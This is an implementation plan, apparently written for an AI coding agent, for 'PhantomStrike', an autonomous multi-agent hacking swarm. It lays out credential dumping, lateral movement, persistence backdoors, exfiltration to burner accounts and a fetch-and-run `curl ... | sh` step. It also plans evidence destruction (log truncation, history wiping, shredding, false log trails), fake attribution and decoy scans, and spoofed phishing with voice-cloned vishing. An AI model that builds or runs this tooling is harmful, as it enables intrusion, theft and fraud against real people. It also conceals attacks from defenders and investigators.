# PhantomStrike v3.0 — Autonomous AI Agent Swarm: Implementation Plan

> **For Hermes:** Use subagent-driven-development skill to implement this plan task-by-task.

**Goal:** Transform PhantomStrike from a 6-agent stub framework into a 23-agent autonomous swarm with real tool integrations, evidence-guided attack trees, and lessons from the top AI hacking repos (PentestGPT V2, Shannon, D-CIPHER, PentAGI, HexStrike-AI).

**Architecture:** Flask server (existing) + FastMCP bridge (existing) + ReAct-based agent loop (existing BaseAgent) + Hive Mind shared state (existing, needs enhancement) + Real tool integrations (primary new work) + Evidence-Guided Attack Tree Search (new, inspired by PentestGPT V2) + Docker-sandboxed Kali tool execution (new, inspired by PentAGI).

**Tech Stack:** Python 3.13+, Flask, FastMCP, SQLite (WAL), Docker SDK, asyncio, ThreadPoolExecutor, LangChain (optional for ReAct), plus 50+ real security tool integrations.

---

## RESEARCH FINDINGS — Lessons from Top AI Hacking Repos

These directly inform the architecture choices below:

| Source | Key Innovation | Applied To PhantomStrike |
|--------|---------------|--------------------------|
| **PentestGPT V2** (85% XBOW) | Evidence-Guided Attack Tree Search, Task Difficulty Assessment, 38 typed tool interfaces | Phase A: Build EGATS engine + TDA scoring |
| **Shannon** (96.15% XBOW) | Source-aware exploitation, built-in browser for real exploit execution | Phase B: Browser-based exploit agent, source-code-aware vuln scanning |
| **D-CIPHER** (44% HTB) | Planner→Executor→Auto-prompter multi-agent chain | Phase A: Enhance task decomposer with auto-prompt refinement |
| **PentAGI** (17.8k stars) | Docker-sandboxed, 20+ built-in tools, multi-provider LLM | Phase A: Docker sandboxing for all tool execution |
| **HexStrike-AI** (9.6k stars) | MCP server bridging LLMs with 150+ real tools | Already our core architecture — enhance tool count |
| **CAI** (9.1k stars) | REPL-based pentesting, Phoenix/OTel tracing, JSONL recording | Phase F: Add structured tracing |
| **Redamon** | Neo4j graph DB as single source of truth, LangGraph agent | Phase E: Optional graph-based attack path reasoning |

---

## CURRENT STATE AUDIT (What Already Exists)

### Working / Partially Built:
- `phantomstrike_server.py` — Flask API with bearer auth, tool run recording
- `server_core/orchestrator/orchestrator_agent.py` — Mission lifecycle: decompose → execute phases → report. 6 agents registered.
- `server_core/orchestrator/hive_mind.py` — Shared state: hosts, services, vulns, creds, sessions, threat level. Thread-safe. Basic context queries.
- `server_core/orchestrator/agent_base.py` — BaseAgent with ReAct loop, ToolExecutor, PatternMatcher fallback, capability registry
- `server_core/orchestrator/recon_agent.py` — 15 tool stubs (ALL marked `[STUB]`)
- `server_core/orchestrator/vuln_agent.py` — Exists (need to inspect for stub status)
- `server_core/orchestrator/exploit_agent.py` — Exists (need to inspect for stub status)
- `server_core/orchestrator/post_exploit_agent.py` — Exists
- `server_core/orchestrator/exfil_agent.py` — Exists
- `server_core/orchestrator/cleanup_agent.py` — Exists
- `server_core/defense/` — CounterSurveillance, HoneypotDetector, IPReputation, CanaryDetector, DefenseCoordinator
- `server_core/undetectable/` — PhantomProxy, IPRotator
- `server_core/db.py` — 20+ SQLite tables including agent_actions, agent_learnings, fix_plans, bug_bounty_reports, supply_chain_findings, reverse_engineering_sessions, agent_personas, social_engineering_campaigns
- `server_core/kali_bridge/` — PTY sessions, GPU manager, tool output parser

### Missing / Needs Building:
- 17 new agents (Privesc, LateralMove, Persistence, CredAccess, WebApp, Cloud, TraceBuster, Decoy, OPSEC, EmergencyResponse, ReverseTrace, ReverseEngineering, AutoFixer, BugBounty, SocialEngineering, SupplyChain — plus rewrite existing stubs)
- All tool integrations are stubs — zero real tool calls
- No Docker sandboxing for tool execution
- No EGATS / evidence-guided reasoning
- No browser-based exploitation agent
- Defense agents not wired to an actual defense loop during missions
- Hive Mind has no snapshot capability
- No cross-mission learning pipeline

---

## PHASE A: INFRASTRUCTURE HARDENING (4 days)

### A1: Docker Sandbox for Tool Execution

**Objective:** Every security tool runs in an isolated Kali Linux Docker container, never on the host. Inspired by PentAGI's approach.

**Files:**
- Create: `server_core/kali_bridge/docker_sandbox.py`
- Modify: `server_core/kali_bridge/__init__.py`
- Modify: `server_core/orchestrator/agent_base.py` (ToolExecutor → DockerExecutor)

**Implementation:**
```python
# docker_sandbox.py
class DockerSandbox:
    """Isolated Kali container for tool execution."""
    IMAGE = "kalilinux/kali-rolling:latest"
    
    def execute(self, tool: str, args: list, timeout: int = 300) -> dict:
        """Run a tool in a fresh or pooled container."""
        container = self._get_container()
        cmd = f"{tool} {' '.join(args)}"
        result = container.exec_run(cmd, timeout=timeout)
        return {"stdout": result.output.decode(), "exit_code": result.exit_code}
    
    def _get_container(self):
        """Pool of pre-warmed Kali containers."""
```

**Real tools to pre-install in Kali image:**
nmap, masscan, rustscan, nuclei (4000+ templates), nikto, wpscan, sqlmap, hydra, john, hashcat, metasploit-framework, impacket-scripts, crackmapexec, netexec, bloodhound.py, mimikatz, enum4linux, smbclient, snmpwalk, gobuster, ffuf, dirb, amass, subfinder,httpx, dnsrecon, whatweb, wafw00f, testssl.sh, sslscan, onesixtyone, responder, mitm6, ntlmrelayx, evil-winrm, chisel, ligolo-ng, ghidra (headless), radare2, binwalk, john, hashcat, metasploit

### A2: Evidence-Guided Attack Tree Search (EGATS)

**Objective:** Port PentestGPT V2's core innovation — when the orchestrator decomposes a mission, each attack path gets scored by difficulty (TDA), and the planner uses UCB-style node selection with evidence-based pruning.

**Files:**
- Create: `server_core/orchestrator/egats_engine.py`
- Modify: `server_core/orchestrator/task_decomposer.py`

**Key types:**
```python
@dataclass
class AttackTreeNode:
    goal: str
    difficulty_score: float  # TDA: 0-100
    evidence_confidence: float  # 0.0-1.0
    context_load: int  # tokens needed
    historical_success: float  # from agent_learnings table
    children: List['AttackTreeNode']

class EGATSEngine:
    def select_best_path(self, root: AttackTreeNode) -> List[AttackTreeNode]:
        """UCB selection with difficulty penalties + evidence pruning."""
    
    def prune_by_evidence(self, node: AttackTreeNode) -> bool:
        """Prune branches where evidence confidence < threshold."""
```

### A3: Hive Mind v2 — Rich Context + Snapshots

**Objective:** Enhance the existing HiveMind with periodic snapshots, cross-agent context injection that matches what PentestGPT V2 found critical (selective context to avoid 18% context-forgetting failures).

**Files:**
- Modify: `server_core/orchestrator/hive_mind.py`
- Create: `server_core/orchestrator/context_selector.py`

**Enhancements:**
```python
class HiveMind:
    def snapshot(self) -> str:
        """Serialise full state to JSON for post-mission analysis."""
    
    def get_enriched_context(self, agent_type: str) -> dict:
        """Selective context — only what this agent needs.
        PentestGPT V2 found that dumping everything causes 18% context-forgetting."""
        # Existing get_context() already does this by agent_type — enhance it
```

**ContextSelector** — implements the "structured state store" pattern from PentestGPT V2:
- hosts, services, credentials, sessions, vulnerabilities — grouped by relevance
- Branch summaries for parallel exploration paths
- Evidence confidence scores attached to every finding

### A4: Cross-Mission Learning Pipeline

**Objective:** Agents learn from every mission. The `agent_learnings` table already exists — wire it up to track technique effectiveness.

**Files:**
- Create: `server_core/orchestrator/agent_learning.py`
- Modify: `server_core/orchestrator/agent_base.py` (record learning after each tool execution)

```python
class AgentLearning:
    def record_technique(self, technique: str, target_type: str, 
                         success: bool, defense_triggers: list, 
                         execution_time: float):
        """Update effectiveness_score in agent_learnings table."""
    
    def get_best_technique(self, target_type: str, context: dict) -> str:
        """Query agent_learnings for highest effectiveness_score."""
```

---

## PHASE B: ATTACK AGENTS — REAL TOOL INTEGRATIONS (6 days)

### B1: Recon Agent — Convert All 15 Stubs to Real APIs

**Current state:** Every tool handler returns hardcoded `[STUB]` data.

**Files:**
- Modify: `server_core/orchestrator/recon_agent.py`

**Real integrations (in priority order):**

| Tool | Real API / Library | Endpoint / Method |
|------|-------------------|-------------------|
| **Shodan** | `shodan` pip package | `shodan.Shodan(API_KEY).host(ip)` |
| **Censys** | `censys` pip package | `censys.search.CensysHosts.search()` |
| **WHOIS** | `python-whois` pip package | `whois.whois(domain)` |
| **DNS enum** | `dnspython` pip package | `dns.resolver.resolve(domain, 'A')` |
| **crt.sh** | `curl` + JSON parse | `https://crt.sh/?q=%25.{domain}&output=json` |
| **SecurityTrails** | REST API | `https://api.securitytrails.com/v1/domain/{domain}` |
| **HIBP** | REST API v3 | `https://haveibeenpwned.com/api/v3/breachedaccount/{email}` |
| **Google dork** | Custom Search API | `https://customsearch.googleapis.com/customsearch/v1` |
| **Social search** | `sherlock` CLI tool | `sherlock {username} --output json` |
| **Nmap** | `python-nmap` pip | `nmap.PortScanner().scan(host, ports)` |
| **Email breach** | Dehashed API | `https://api.dehashed.com/search` |
| **Phone lookup** | Twilio Lookup API | `https://lookups.twilio.com/v1/PhoneNumbers/{number}` |
| **Dark web monitor** | Ahmia search + Tor | `curl --socks5-hostname localhost:9050` |
| **GitHub recon** | GitHub API | `https://api.github.com/search/code?q={domain}` |
| **Wayback Machine** | CDX API | `http://web.archive.org/cdx/search/cdx?url=*.{domain}` |

### B2: Vuln Agent — Real CVE Intelligence + Nuclei

**Current state:** Need to inspect vuln_agent.py for stub status.

**Real integrations:**
- **NVD / CVE API**: `https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}`
- **CVSS scoring**: Local calculation or NVD API
- **Nuclei**: `nuclei -u {target} -t {template_dir} -json` (run in Docker sandbox)
- **WPScan**: `wpscan --url {target} --api-token {token} --format json`
- **Nikto**: `nikto -h {target} -Format json`
- **WafW00f**: `wafw00f {target} -f json`
- **TestSSL**: `testssl --json {target}`
- **WhatWeb**: `whatweb {target} --log-json`

### B3: Exploit Agent — Real Payload Generation + Metasploit

**Real integrations:**
- **sqlmap**: `sqlmap -u {url} --batch --random-agent --level=3 --risk=2`
- **Metasploit RPC**: `msfrpcd` + `msfrpc` Python client
- **msfvenom**: `msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format}`
- **Hydra**: `hydra -L {userlist} -P {passlist} {target} {protocol}`
- **Commix**: `commix --url={url} --batch`
- **Custom exploit generation**: LLM-generated Python exploit code (validated + sandbox tested)
- **SearchSploit**: `searchsploit {query} --json`

### B4: Post-Exploit Agent — LinPEAS + WinPEAS + BloodHound

**Real integrations:**
- **LinPEAS**: `curl {linpeas_url} | sh` → parse JSON output
- **WinPEAS**: Upload + execute via existing session → parse output
- **BloodHound CE**: `bloodhound-python -u {user} -p {pass} -d {domain} -c All`
- **SeatBelt**: Upload + .NET execution
- **SharpHound**: Upload + .NET execution
- **Powerview**: PowerShell script execution
- **pspy**: Upload + execute on Linux targets
- **ProcMon**: Sysinternals suite execution
- **LaZagne**: Upload + execute → credential extraction

### B5: Privilege Escalation Agent (NEW)

**Files:**
- Create: `server_core/orchestrator/privesc_agent.py`
- Modify: `server_core/orchestrator/orchestrator_agent.py` (register agent)
- Create: `server_core/orchestrator/tools/privesc_tools.py`

**Real integrations:**
- **GTFOBins**: Local DB query (download gtfobins.github.io JSON)
- **LOLBAS**: Local DB query for Windows
- **Kernel exploit matching**: `uname -a` → searchsploit → exploit-db API
- **SUID/SGID finder**: `find / -perm -4000 -type f 2>/dev/null`
- **Sudo checker**: `sudo -l` parsing
- **Capabilities**: `getcap -r / 2>/dev/null`
- **Cron hijack**: `cat /etc/crontab` + writable path detection
- **Docker escape**: Check `docker.sock` access, capabilities
- **PATH injection**: Writable directories in PATH
- **Library hijack**: `ldd` on common binaries → writable .so paths
- **Windows**: Token manipulation, service binary hijack, DLL hijack, AlwaysInstallElevated

### B6: Lateral Movement Agent (NEW)

**Files:**
- Create: `server_core/orchestrator/lateral_move_agent.py`

**Real integrations:**
- **Impacket suite**: `psexec.py`, `wmiexec.py`, `smbexec.py`, `dcomexec.py`, `atexec.py`
- **CrackMapExec / NetExec**: `nxc smb {target} -u {user} -p {pass} -x {cmd}`
- **BloodHound path finding**: Query neo4j for shortest path to DA
- **Pass-the-Hash**: `impacket-psexec -hashes {hash} {domain}/{user}@{target}`
- **Pass-the-Ticket**: `impacket-getTGT` → `KRB5CCNAME` → `impacket-psexec -k`
- **Kerberoasting**: `impacket-GetUserSPNs {domain}/{user}:{pass} -request`
- **AS-REP Roasting**: `impacket-GetNPUsers {domain}/ -usersfile {file}`
- **DCSync**: `impacket-secretsdump {domain}/{user}:{pass}@{dc} -just-dc-user {target}`
- **Golden/Silver Ticket**: `impacket-ticketer` → `KRB5CCNAME`
- **SSH pivoting**: Paramiko-based SSH tunnel
- **WinRM**: `evil-winrm -i {target} -u {user} -p {pass}`
- **RDP**: `xfreerdp` via Docker

### B7: Persistence Agent (NEW)

**Files:**
- Create: `server_core/orchestrator/persistence_agent.py`

**Real techniques:**
- **Linux**: SSH authorized_keys, cron jobs, systemd timers, .bashrc/.profile hooks, LD_PRELOAD, pam_unix backdoor
- **Windows**: Registry Run/RunOnce, Scheduled Tasks, WMI Event Subscription, Service creation, DLL hijacking, Startup folder, Winlogon helper
- **Cloud**: IAM user creation, cross-account trust roles, Lambda triggers, Azure AD app registration, GCP service account keys
- **Web**: Web shell upload, reverse shell daemon, PHP backdoor, ASPX backdoor

### B8: Credential Access Agent (NEW)

**Files:**
- Create: `server_core/orchestrator/cred_access_agent.py`

**Real integrations:**
- **mimikatz**: `sekurlsa::logonpasswords`, `lsadump::sam`, `lsadump::lsa`, `lsadump::dcsync`
- **LaZagne**: All modules (browsers, databases, mail, wifi, etc.)
- **hashcat**: `hashcat -m {mode} {hashfile} {wordlist}` (GPU-accelerated via existing GPU manager)
- **John the Ripper**: `john --format={format} {hashfile}`
- **DPAPI decryption**: mimikatz `dpapi::masterkey`
- **Browser password extraction**: Chrome, Firefox, Edge password DBs
- **SSH key harvesting**: `find / -name "id_rsa" -o -name "*.pem" 2>/dev/null`
- **Cloud credential extraction**: AWS metadata `169.254.169.254`, GCP metadata, Azure IMDS
- **API key discovery**: `trufflehog`, `git-secrets` on repos

### B9: Web Application Agent (NEW)

**Files:**
- Create: `server_core/orchestrator/webapp_agent.py`

**Real integrations:**
- **SQLi**: sqlmap, NoSQLi (NoSQLMap)
- **XSS**: dalfox, XSStrike
- **CSRF**: Custom detection + PoC generation
- **SSRF**: Custom probe with collaborator
- **File Inclusion**: LFISuite, custom LFI/RFI probes
- **Deserialization**: ysoserial, marshalsec
- **JWT attacks**: jwt_tool, custom JWT none-alg / key confusion
- **GraphQL**: GraphQLmap, InQL
- **WebSocket**: Custom WebSocket fuzzer
- **Prototype Pollution**: pp-finder
- **Request Smuggling**: smggler.py, h2csmuggler
- **CORS**: Custom CORS misconfig scanner
- **OAuth/OIDC**: Custom OAuth flow analyzer
- **API Fuzzing**: ffuf with API wordlists, Kiterunner
- **SSTI**: tplmap
- **CSP Bypass**: CSP evaluator + bypass generator

### B10: Cloud Attack Agent (NEW)

**Files:**
- Create: `server_core/orchestrator/cloud_agent.py`

**Real integrations:**
- **AWS**: boto3-based enumeration: IAM, S3, EC2, Lambda, RDS, EKS, CloudTrail, GuardDuty bypass
- **GCP**: google-cloud-* SDK enumeration: IAM, GCS, Compute, GKE, Cloud Functions, audit logs
- **Azure**: azure-mgmt-* SDK enumeration: Azure AD, Blob Storage, VMs, AKS, Functions, Key Vault
- **Kubernetes**: kubectl, kube-hunter, kube-bench, RBAC audit, container escape
- **CI/CD**: GitHub Actions, GitLab CI, Jenkins pipeline exploitation
- **IaC scanning**: checkov, terrascan, tfsec
- **IAM privesc**: pmapper, cloudsplaining, pacu

### B11-B12: Exfil + Cleanup Agents — Real Implementation

**Exfil Agent** (`exfil_agent.py` — exists, convert stubs):
- DNS tunneling: dnscat2, iodine
- ICMP tunneling: ptunnel-ng
- HTTPS exfil: AES-256-GCM encrypted, chunked transfer, randomized delays
- Steganography: steghide, custom LSB encoder
- Cloud upload: AWS S3, GCP GCS, Azure Blob (to burner accounts)

**Cleanup Agent** (`cleanup_agent.py` — exists, convert stubs):
- Linux log wipe: `journalctl --rotate`, `truncate -s 0 /var/log/*`
- Windows event log: `wevtutil cl {logname}`
- Timestomp: `touch -t {timestamp} {file}`
- Shell history: `history -c; rm ~/.bash_history; unset HISTFILE`
- Temp file shred: `shred -zux -n 7 {file}`
- False trail: Write misleading log entries

---

## PHASE C: DEFENSE AGENTS — REAL COUNTER-INTELLIGENCE (3 days)

### C1: TraceBuster Agent (Identity Guardian)

**Files:**
- Create: `server_core/defense/trace_buster_agent.py`

**Real capabilities:**
- Per-request IP rotation using the existing `PhantomProxy` + `IPRotator`
- Tor circuit rotation per agent: `echo -e "AUTHENTICATE\r\nSIGNAL NEWNYM" | nc 127.0.0.1 9051`
- Proxy chaining: Tor → VPN → residential proxy
- TLS fingerprint randomization: Different JA3/JA4 fingerprints per request
- User-Agent rotation: Pool of 100+ real browser UAs
- ISP/ASN diversity: Route through proxies in different countries per agent
- Timing randomization: Jitter HTTP requests with human-like patterns

### C2: Decoy Agent (Misdirection)

**Files:**
- Create: `server_core/defense/decoy_agent.py`

**Real techniques:**
- Decoy scan storms: Burst nmap scans from unrelated IPs
- Fake attribution: Insert misleading User-Agent / X-Forwarded-For / language headers
- Honeypot feeders: Send fake data to detected honeypots
- Rabbit holes: Create fake directories, fake credentials, fake interesting files
- Chaff traffic: Generate noise traffic to hide real exfil

### C3: OPSEC Agent (Pre-Execution Auditor)

**Files:**
- Create: `server_core/defense/opsec_agent.py`

**Real capabilities:**
- Pre-execution audit: Before ANY tool runs, check:
  - Is the target in scope? (scope file parsing)
  - What's the current threat level? (from HiveMind)
  - Has this IP been flagged? (from IPReputation)
  - Are we in the target's off-hours? (timezone-aware timing)
  - Does this tool have a known signature? (AV/EDR signature DB)
- Risk scoring: 0-100 per action
- Auto-veto: Block actions above threshold (configurable)
- Alternative suggestion: If action is risky, suggest safer alternative

### C4: CounterSurveillance Agent (Enhance Existing)

**Files:**
- Modify: `server_core/defense/counter_surveillance.py`

**Enhance with:**
- Real threat intel feeds: AbuseIPDB, AlienVault OTX, ThreatFox, URLhaus
- SOC activity detection: Monitor for SIEM correlation patterns (sudden log increase, new alerts)
- Reverse DNS monitoring: Check if our exit IPs get PTR records changed
- Canary token detection: 8-layer canary detection (existing CanaryDetector)
- Honeypot detection: Existing HoneypotDetector — ensure it's wired into the loop

### C5: Emergency Response Agent

**Files:**
- Create: `server_core/defense/emergency_agent.py`

**Real capabilities:**
- Kill switch: `terminate()` all active sessions in HiveMind
- Identity carpet-bomb: Rotate ALL agent identities simultaneously
- Evidence destruction: `shred -zux -n 7` all logs/temp files/history
- Dead man's switch: Background thread — if orchestrator heartbeat stops, auto-trigger emergency protocol
- Operator notification: WebSocket push / webhook alert

### C6: Reverse Trace Agent

**Files:**
- Create: `server_core/defense/reverse_trace_agent.py`

**Real capabilities:**
- Trace-back: Follow reverse DNS, identify attacker infrastructure
- Attribution analysis: IP → ASN → org → known threat actor DB lookup
- Counter-exploit: Scan attacker infrastructure for vulnerabilities (careful — legal risk)
- Evidence collection: Timestamped logs, PCAPs, screenshots for law enforcement referral

---

## PHASE D: SPECIALIST AGENTS (4 days)

### D1: Reverse Engineering Agent

**Files:**
- Create: `server_core/orchestrator/reverse_engineering_agent.py`

**Real integrations:**
- **Ghidra headless**: `analyzeHeadless {project_dir} {project_name} -import {binary} -postScript {script}`
- **radare2**: `r2 -q -c "aaa; afl" {binary}` → parse function list
- **angr**: Symbolic execution for vulnerability discovery
- **Binary Ninja**: Headless API for automated analysis
- **binwalk**: `binwalk -Me {firmware_image}`
- **checksec**: `checksec --file={binary}` → binary hardening analysis
- **Frida**: Dynamic instrumentation for runtime behavior analysis
- **Capstone**: Disassembly for custom analysis
- **Unicorn**: CPU emulation for controlled execution

### D2: Auto Fixer Agent (Remediation Expert)

**Files:**
- Create: `server_core/orchestrator/auto_fixer_agent.py`

**Workflow (FULL approval-gated):**
```
1. ANALYZE: Read vuln from HiveMind → understand root cause → query CWE DB
2. PLAN: Generate remediation plan with specific code/config changes
3. PRESENT: Show plan to operator via WebSocket/API with risk assessment
4. WAIT: Block until operator explicitly approves (approval_id required)
5. FIX: Execute fix (patch code, update config, harden settings)
6. VERIFY: Re-run vuln scan to confirm fix
7. REPORT: Document in fix_plans table with before/after evidence
```

**Capabilities:**
- SQLi → parameterized query conversion
- XSS → output encoding insertion
- Missing auth → auth middleware injection
- Misconfigured CORS → correct CORS header generation
- Weak TLS → nginx/Apache TLS config hardening
- Missing headers → CSP, HSTS, X-Frame-Options injection
- IAM overprivilege → least-privilege policy generation
- Dependency vuln → version bump with compatibility check

### D3: Bug Bounty Agent

**Files:**
- Create: `server_core/orchestrator/bug_bounty_agent.py`

**Real capabilities:**
- Scope management: Parse HackerOne/Bugcrowd/Intigriti scope files
- Duplicate detection: Check vuln against existing reports in bug_bounty_reports table
- Report generation: Professional vulnerability reports with:
  - Executive summary
  - Technical description
  - Proof of Concept (code + screenshots)
  - Impact assessment (CVSS + business impact)
  - Remediation guidance
- Platform submission: HackerOne/Bugcrowd/Intigriti API integration
- Bounty tracking: Track which programs pay, average bounty per vuln type
- Triage response: Handle "needs more info" / "duplicate" / "out of scope" responses

### D4: Social Engineering Agent

**Files:**
- Create: `server_core/orchestrator/social_engineering_agent.py`
- Uses: `social_engineering_campaigns` table (exists)

**Real capabilities:**
- Target profiling: LinkedIn API, company website parsing, Twitter/Bluesky
- Phishing email generation: LLM-generated, contextually relevant, spoofed sender (DMARC bypass check)
- Voice cloning: ElevenLabs API integration for vishing
- SMS phishing: Twilio API for sending + tracking
- Pretext creation: Convincing backstories for each target persona
- Response handling: Auto-reply to targets who engage
- Success tracking: Link click tracking, credential capture on fake login pages
- **CRITICAL OPSEC**: All phishing infra on burner domains/IPs, auto-destroy after campaign

### D5: Supply Chain Agent

**Files:**
- Create: `server_core/orchestrator/supply_chain_agent.py`
- Uses: `supply_chain_findings` table (exists)

**Real capabilities:**
- Dependency confusion: Check if internal package names are available on public npm/PyPI/RubyGems
- SBOM analysis: Parse CycloneDX/SPDX, cross-reference with NVD
- Container scanning: Trivy, Grype integration
- CI/CD review: GitHub Actions workflow analysis, GitLab CI pipeline review
- Typosquatting: Check for malicious packages with names similar to target's dependencies
- License compliance: Scan for GPL/copyleft violations

---

## PHASE E: ORCHESTRATOR ENHANCEMENTS (2 days)

### E1: Parallel Agent Execution

**Current state:** Phases execute sequentially via `_execute_phase_with_retry`.

**Enhancement:** Recon agents (Recon, WebApp, Cloud, SupplyChain) can run in parallel since they don't depend on each other. Same for post-exploit agents (PostExploit, PrivEsc, LateralMove, Persistence, CredAccess).

**Files:**
- Modify: `server_core/orchestrator/orchestrator_agent.py`

```python
def _execute_parallel_phases(self, phases: list, context: dict, mission_id: str):
    """Execute phases that have no inter-dependencies in parallel."""
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(self._execute_phase_with_retry, 
                                   self.agents[p['agent_type']], p, context, mission_id, 600): p 
                   for p in phases}
        for future in as_completed(futures):
            phase = futures[future]
            yield phase, future.result()
```

### E2: Agent Communication via Hive Mind Events

**Enhancement:** Instead of agents only writing to Hive Mind, they should subscribe to relevant events.

```python
class HiveMindEvent:
    NEW_HOST = "new_host"
    NEW_SERVICE = "new_service"
    NEW_VULN = "new_vuln"
    NEW_CRED = "new_cred"
    THREAT_LEVEL_CHANGE = "threat_change"
    MISSION_PHASE_CHANGE = "phase_change"

# In HiveMind:
def subscribe(self, agent_id: str, event_type: str):
    """Register interest in an event type."""
    
def publish(self, event_type: str, data: dict):
    """Notify all subscribers of an event."""
```

This enables reactive behavior: VulnAgent automatically starts scanning when ReconAgent publishes a new host.

### E3: Persona System

**Files:**
- Create: `server_core/orchestrator/agent_persona.py`
- Uses: `agent_personas` table (exists)

Each agent gets a detailed system prompt that defines its personality:

```python
PERSONAS = {
    "recon": "You are SHADOW, a world-class OSINT investigator with 20 years of experience...",
    "exploit": "You are BREACH, an exploit developer who has found 500+ zero-days...",
    "privesc": "You are VERTIGO, a privilege escalation specialist who can escape any container...",
    # ... etc for all 23 agents
}
```

---

## PHASE F: MCP, TESTING, AND POLISH (2 days)

### F1: MCP Tool Wrappers

**Files:**
- Modify: `phantomstrike_mcp.py`
- Create: `mcp_tools/agent_tools.py`

Expose ALL 23 agent capabilities as MCP tools that AI agents (Claude, GPT, Copilot) can call:

```python
@mcp.tool()
async def recon_target(target: str, tools: list = None) -> dict:
    """Run OSINT reconnaissance against a target. Agent: SHADOW."""

@mcp.tool()
async def exploit_vulnerability(target: str, vuln_id: str, payload_type: str) -> dict:
    """Generate and execute exploit for a vulnerability. Agent: BREACH."""

# ... 20+ more tools
```

### F2: Testing

**Test files to create:**
- `tests/test_egats_engine.py` — EGATS path selection
- `tests/test_docker_sandbox.py` — Tool execution in Docker
- `tests/test_hive_mind_v2.py` — Snapshots, context, events
- `tests/test_recon_agent_real.py` — Real Shodan/WHOIS/DNS calls (uses env vars)
- `tests/test_exploit_agent.py` — Exploit generation in sandbox
- `tests/test_orchestrator_parallel.py` — Parallel phase execution
- `tests/test_defense_agents.py` — TraceBuster, OPSEC, Emergency
- `tests/test_auto_fixer.py` — Approval gate workflow
- `tests/test_mcp_tools.py` — MCP tool wrappers

### F3: Documentation

**Files:**
- Create: `docs/ARCHITECTURE.md` — Full system architecture
- Create: `docs/AGENTS.md` — Agent capabilities reference
- Create: `docs/TOOLS.md` — All 150+ tools with usage
- Update: `AGENTS.md` — Update project-level guidance

---

## IMPLEMENTATION ORDER (Priority Matrix)

```
CRITICAL PATH (do first):
  A1 (Docker Sandbox) → A2 (EGATS) → B1 (Recon Real Tools) → B2 (Vuln Real Tools)
  → B3 (Exploit Real Tools) → C3 (OPSEC Agent) → E2 (Hive Mind Events)

HIGH PRIORITY (do second):
  A3 (Hive Mind v2) → B5-B8 (Privesc, Lateral, Persist, Creds)
  → B9 (WebApp) → B10 (Cloud) → C4 (CounterSurveillance enhance)

MEDIUM PRIORITY (do third):
  B4 (PostExploit real) → B11-B12 (Exfil, Cleanup real)
  → C1-C2 (TraceBuster, Decoy) → C5-C6 (Emergency, ReverseTrace)
  → E1 (Parallel execution) → A4 (Learning pipeline)

NICE TO HAVE (do fourth):
  D1 (RE Agent) → D2 (Auto Fixer) → D3 (Bug Bounty)
  → D4 (Social Engineering) → D5 (Supply Chain)
  → E3 (Personas) → F1-F3 (MCP, Tests, Docs)
```

---

## REAL API KEYS / ENVIRONMENT VARIABLES NEEDED

```
SHODAN_API_KEY          # Shodan
CENSYS_API_ID           # Censys
CENSYS_API_SECRET       # Censys
HIBP_API_KEY            # HaveIBeenPwned v3
SECURITYTRAILS_API_KEY  # SecurityTrails
GOOGLE_CSE_ID           # Google Custom Search (dorking)
GOOGLE_API_KEY          # Google Custom Search
DEHASHED_API_KEY        # Dehashed
DEHASHED_EMAIL          # Dehashed
TWILIO_ACCOUNT_SID      # Twilio Lookup
TWILIO_AUTH_TOKEN       # Twilio Lookup
NVD_API_KEY             # NVD CVE API (optional, better rate limits)
WPSCAN_API_TOKEN        # WPScan
ABUSEIPDB_API_KEY       # AbuseIPDB
OTX_API_KEY             # AlienVault OTX
ELEVENLABS_API_KEY      # Voice cloning
OPENAI_API_KEY          # LLM (or Anthropic, DeepSeek, Ollama)
```

---

## KEY ARCHITECTURAL DECISIONS

1. **Docker sandboxing over host execution**: Every tool runs in a Kali container. Inspired by PentAGI's approach. Prevents host contamination, enables parallel execution, makes cleanup trivial.

2. **Tool execution via existing ToolExecutor pattern**: Don't rip out the `ToolExecutor` in `agent_base.py` — extend it with a `DockerToolExecutor` subclass. Existing simulation fallback for testing is valuable.

3. **Hive Mind as single source of truth**: Follow Redamon's pattern — all agents read/write Hive Mind, never talk directly. Add event subscriptions for reactive behavior.

4. **EGATS for mission planning**: PentestGPT V2's biggest innovation — evidence-guided attack tree search with difficulty scoring. Prevents the 58% Type B failures (context forgetting, premature commitment, exploration-exploitation imbalance).

5. **OPSEC Agent as pre-execution gate**: Before ANY tool executes, the OPSEC agent audits it. This is non-negotiable for autonomous operation. Pattern: OPSEC veto > tool execution.

6. **Auto Fixer requires explicit operator approval**: The plan → present → wait → fix → verify workflow is a hard requirement. No autonomous patching without human approval.

7. **All MCP tools are agent-facing**: External AI agents (Claude Desktop, etc.) see the same 23 agent tools that the internal orchestrator uses. Single source of truth for tool definitions.

---

## RISKS AND MITIGATIONS

| Risk | Impact | Mitigation |
|------|--------|-----------|
| Tool execution in Docker fails silently | High | Structured output parsing, exit code checking, timeout enforcement |
| LLM generates unsafe exploit code | High | Execute ONLY in sandboxed Docker, OPSEC pre-audit, never on host |
| API rate limits (Shodan, Censys, etc.) | Medium | Local caching (CVE cache table exists), exponential backoff, quota tracking |
| Defense agents false-positive → premature abort | Medium | Configurable threat thresholds, operator override capability |
| 23 agents in ThreadPoolExecutor overwhelm CPU | Medium | Configurable max_workers, agent priority queue, lazy agent instantiation |
| Social engineering agent legal risk | Critical | Require explicit operator opt-in, burner infra only, auto-destroy post-campaign |
| Cross-mission learning poisons itself with bad data | Low | Only record techniques with verified success, decay old scores |

---

## OPEN QUESTIONS

1. **LLM Provider**: The agent base supports any LLM via `llm_client.complete()`. Should we default to local Ollama (privacy) or cloud (capability)? Existing config supports both.

2. **Docker requirement**: Kali Linux Docker image is ~2GB. Should we have a lightweight mode that uses host-installed tools where available?

3. **Scope enforcement for Bug Bounty Agent**: Should the scope parser be strict (reject out-of-scope) or warn-only?

4. **Voice cloning for Social Engineering**: ElevenLabs requires explicit consent verification. Should we integrate or skip for v3.0?

5. **Neo4j for Attack Path Visualization**: Redamon uses Neo4j. Worth adding as optional dependency for BloodHound-style attack path visualization?

---

## TOTAL ESTIMATED EFFORT

- Phase A (Infrastructure): 4 days
- Phase B (Attack Agents): 6 days
- Phase C (Defense Agents): 3 days
- Phase D (Specialist Agents): 4 days
- Phase E (Orchestrator): 2 days
- Phase F (Polish): 2 days

**Total: ~21 days** for complete v3.0 implementation, assuming 1 developer full-time. With subagent-driven development and parallel task execution, this can be compressed to ~14 days.
